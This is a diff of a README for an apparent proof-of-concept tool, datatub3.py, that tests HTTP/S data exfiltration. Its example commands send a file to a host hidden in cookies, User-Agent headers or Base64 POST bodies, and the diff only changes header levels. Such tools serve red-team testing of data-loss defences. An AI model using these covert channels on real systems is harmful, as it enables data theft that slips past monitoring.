@@ -18,13 +18,13 @@ Tool development to make PoC of Data Exfiltration HTTP/S (Client Version).
 - All requests encoded with Base 64
 
 # Exemples
-## Exfiltration Cookie
+### Exfiltration Cookie
 python3 datatub3.py -u http://192.168.137.129 --cookie poc.txt
 
-## Exfiltration User-Agent
+### Exfiltration User-Agent
 python3 datatub3.py -u http://192.168.137.129 --useragent poc.txt
 
-## Exfiltration Base 64
+### Exfiltration Base 64
 python3 datatub3.py -u http://192.168.137.129 –post-b64 poc.txt
 
 ![Command](https://i.imgur.com/Eoe2Kol.png)
